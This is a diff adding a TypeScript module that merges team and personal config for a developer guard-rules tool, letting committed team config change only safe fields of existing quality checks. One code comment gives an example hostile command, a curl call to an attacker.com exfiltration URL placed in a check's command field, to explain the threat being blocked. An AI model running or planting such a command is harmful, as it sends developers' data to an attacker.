@@ -1,0 +1,125 @@
+// ===========================================
+// Rules — Config Merging
+// ===========================================
+// Merges team config (`.interlinked/guard-rules.json`) and personal
+// overrides (`.interlinked/guard-rules.local.json`) into the default
+// config produced by `rules/default-config.ts`.
+//
+// Security note: team config is committed, so any arbitrary `command`
+// field could silently execute on every developer's machine. We allow
+// team config to toggle safe fields only — see QUALITY_CHECK_SAFE_FIELDS.
+
+import type { GuardRulesConfig, QualityCheckConfig } from "../types.js";
+
+/**
+ * Team config (git-committed) can toggle settings but CANNOT define
+ * arbitrary commands. This prevents a malicious PR from adding a quality
+ * check with "command": "curl https://attacker.com/exfil" that would
+ * execute on every developer's machine.
+ *
+ * Specifically, team config can:
+ *   - Add guard rules (pattern matching only, no command execution)
+ *   - Add protected file rules
+ *   - Toggle quality check enabled/file_types/severity/timeout_ms on EXISTING checks
+ *   - Configure curl_mcp_detection, project_specific
+ *
+ * Team config CANNOT:
+ *   - Set or change the `command` field on quality checks
+ *   - Add new quality check entries with custom commands
+ */
+const QUALITY_CHECK_SAFE_FIELDS = new Set([
+	"enabled",
+	"file_types",
+	"timeout_ms",
+	"severity",
+	"description",
+]);
+
+/**
+ * Public API — consumed by `rules/loader.ts` via `loadRules()`.
+ *
+ * Merges team-level config into the default config. Mutates `config`
+ * in place. Ignores dangerous fields like `command` on unknown checks.
+ */
+export function mergeTeamRules(config: GuardRulesConfig, team: Partial<GuardRulesConfig>): void {
+	if (team.enabled === false) config.enabled = false;
+	if (team.rules) config.rules = team.rules;
+	if (team.protected_files) config.protected_files = team.protected_files;
+	if (team.file_reminders) config.file_reminders = team.file_reminders;
+	if (team.curl_mcp_detection) {
+		Object.assign(config.curl_mcp_detection, team.curl_mcp_detection);
+	}
+	if (team.quality_checks) {
+		// Team config can only toggle safe fields on EXISTING checks — not add commands
+		for (const [key, teamCheck] of Object.entries(team.quality_checks)) {
+			const existing = config.quality_checks[key];
+			if (!existing) continue; // Team cannot add new check entries
+			if (!teamCheck || typeof teamCheck !== "object") continue;
+			const checkOverrides: Partial<QualityCheckConfig> = teamCheck;
+			for (const field of Object.keys(checkOverrides)) {
+				if (!QUALITY_CHECK_SAFE_FIELDS.has(field)) continue;
+				// Safe fields: enabled, file_types, timeout_ms, severity, description
+				const safeKey = field as keyof Pick<
+					QualityCheckConfig,
+					"enabled" | "file_types" | "timeout_ms" | "severity" | "description"
+				>;
+				const val = checkOverrides[safeKey];
+				if (val !== undefined) {
+					existing[safeKey] = val as never;
+				}
+			}
+		}
+	}
+	if (team.error_memory) {
+		Object.assign(config.error_memory, team.error_memory);
+	}
+	if (team.project_specific) {
+		config.project_specific = team.project_specific;
+	}
+	if (team.policy_classifier) {
+		config.policy_classifier = team.policy_classifier;
+	}
+	if (team.auto_coordination) {
+		config.auto_coordination = team.auto_coordination;
+	}
+	if (team.project_wide_checks && config.project_wide_checks) {
+		Object.assign(config.project_wide_checks, team.project_wide_checks);
+	}
+}
+
+/**
+ * Public API — consumed by `rules/loader.ts` via `loadRules()`.
+ *
+ * Merges local (personal, gitignored) overrides into the config. Local
+ * overrides are trusted because they live only on the developer's
+ * machine, so they can set `command` fields and add new checks freely.
+ */
+export function mergeLocalOverrides(
+	config: GuardRulesConfig,
+	local: Partial<GuardRulesConfig>,
+): void {
+	if (local.disabled_rules) {
+		config.disabled_rules = local.disabled_rules;
+	}
+	if (local.extra_exceptions) {
+		config.extra_exceptions = local.extra_exceptions;
+	}
+	// Local can add personal file reminders (appended to team reminders)
+	if (local.file_reminders) {
+		config.file_reminders = [...config.file_reminders, ...local.file_reminders];
+	}
+	// Local can override quality checks (e.g., disable tsc on slow machines)
+	if (local.quality_checks) {
+		for (const [key, check] of Object.entries(local.quality_checks)) {
+			if (config.quality_checks[key]) {
+				Object.assign(config.quality_checks[key], check);
+			} else {
+				config.quality_checks[key] = check;
+			}
+		}
+	}
+	// Local can override project-wide checks (e.g., disable on slow machines)
+	if (local.project_wide_checks && config.project_wide_checks) {
+		Object.assign(config.project_wide_checks, local.project_wide_checks);
+	}
+}
